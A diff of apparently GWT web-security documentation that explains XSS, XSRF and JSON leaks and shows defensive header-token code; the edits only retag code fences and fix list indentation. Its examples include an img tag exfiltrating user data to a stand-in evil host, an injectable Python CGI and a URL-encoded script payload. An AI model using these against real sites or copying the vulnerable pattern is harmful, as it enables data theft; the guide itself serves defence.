@@ -47,7 +47,7 @@ probably know that you can cause an image hosted on foo.com to appear inline in 
 
 Normally you would view this as a read-only operation: the browser requests an image, and the server sends the data. The browser didn't upload anything, so no data can be lost, right? Almost, but not quite. The browser _did_ upload something: namely, the URL of the image. Images use standard URLs, and any URL can have query parameters encoded in it. A legitimate use case for this might be a page hit counter image, where a CGI on the server selects an appropriate image based on a query parameter and streams the data to the user in response. Here is a reasonable (though hypothetical) URL that could return a hit-count image showing the number '42':
 
-```
+```text
 http://site.domain.tld/pagehits?count=42
 ```
 
@@ -61,7 +61,7 @@ It is then free to construct a URL to any hostile domain, stick it in an `<img>`
 make the request. It's not hard to imagine a scenario where the evil code steals some useful
 information and encodes it in the `<img>` URL; an example might be a tag such as:
 
-```
+```html
 <img src="http://evil.domain.tld/pagehits?private_user_data=12345"/>
 ```
 
@@ -93,7 +93,7 @@ uge chunks of their lives thinking up ways to do this.
 
 The list of ways that evil code can get into an otherwise good page is endless. Usually they all boil down to unwary code that parrots user input back to the user. For instance, this Python CGI code is vulnerable:
 
-```
+```python
 import cgi
 f = cgi.FieldStorage()
 name = f.getvalue('name') or 'there'
@@ -108,7 +108,7 @@ print s
 
 The code is supposed to print a simple greeting, based on a form input. For instance, a URL like this one would print "Hello, Dan!":
 
-```
+```text
 http://site.domain.tld/path?name=Dan
 ```
 
@@ -116,13 +116,13 @@ However, because the CGI doesn't inspect the value of the "name" variable, an at
 
 Here is some JavaScript that pops up an alert window:
 
-```
+```html
 <script>alert('Hi');</script>
 ```
 
 That script code can be encoded into a URL such as this:
 
-```
+```text
 http://site.domain.tld/path?name=Dan%3Cscript%20%3Ealert%28%22Hi%22%29%3B%3C/script%3E
 ```
 
@@ -158,25 +158,25 @@ As bad as XSS and XSRF are, JSON gives them room to breathe, so to speak, which 
 
 *   A JSON string returned as the response text from an XMLHTTPRequest call (or other request)
 
-        Examples:
+    Examples:
 
-        ` [ 'foo', 'bar' ]`
+    * ` [ 'foo', 'bar' ]`
 
-        ` { 'data': ['foo', 'bar'] }`
+    * ` { 'data': ['foo', 'bar'] }`
 
-        Typically these strings are parsed via a call to JavaScript's 'eval' function for fast decoding.
+    Typically these strings are parsed via a call to JavaScript's 'eval' function for fast decoding.
 
 *   A string containing a JSON object assigned to a variable, returned by a server as the response to a `<script>`tag.
 
-        Example:
+    Example:
 
-        ` var result = { 'data': ['foo', 'bar'] };`
+    ` var result = { 'data': ['foo', 'bar'] };`
 
 *   A string containing a JSON object passed as the parameter to a function call -- that is, the JSONP model.
 
-        Example:
+   Example:
 
-        ` handleResult({'data': ['foo', 'bar']});`
+   ` handleResult({'data': ['foo', 'bar']});`
 
 The last two examples are most useful when returned from a server as the response to a `<script>`tag inclusion. This could use a little explanation. Earlier text described how JavaScript is permitted to dynamically add `<img>`tags pointing to images on remote sites. The same is true of `<script>`tags: JavaScript code can dynamically insert new `<script>` tags that cause more JavaScript code to load.
 
@@ -224,7 +224,7 @@ It's a common technique to fill out the bodies of tables, DIVs, frames, and simi
 
 Here's an example. Consider this basic JavaScript page:
 
-```
+```html
 <html>
 <head>
   <script language="JavaScript">
@@ -286,7 +286,7 @@ A common countermeasure for XSRF attacks involves duplicating a session cookie. 
 
 If you are using the [RequestBuilder](/javadoc/latest/com/google/gwt/http/client/RequestBuilder.html) and [RequestCallback](/javadoc/latest/com/google/gwt/http/client/RequestCallback.html) classes in GWT, you can implement XSRF protection by setting a custom header to contain the value of your cookie. Here is some sample code:
 
-```
+```java
 RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, url);
 rb.setHeader("X-XSRF-Cookie", Cookies.getCookie("myCookieKey"));
 rb.sendRequest(null, myCallback);
@@ -294,7 +294,7 @@ rb.sendRequest(null, myCallback);
 
 If you are using GWT's RPC mechanism, the solution is unfortunately not quite as clean. However, there are still several ways you can accomplish it. For instance, you can add an argument to each method in your [RemoteService](/javadoc/latest/com/google/gwt/user/client/rpc/RemoteService.html) interface that contains a String. That is, if you wanted this interface:
 
-```
+```java
 public interface MyInterface extends RemoteService {
   public boolean doSomething();
   public void doSomethingElse(String arg);
@@ -303,7 +303,7 @@ public interface MyInterface extends RemoteService {
 
 ...you could actually use this:
 
-```
+```java
 public interface MyInterface extends RemoteService {
   public boolean doSomething(String cookieValue);
   public void doSomethingElse(String cookieValue, String arg);
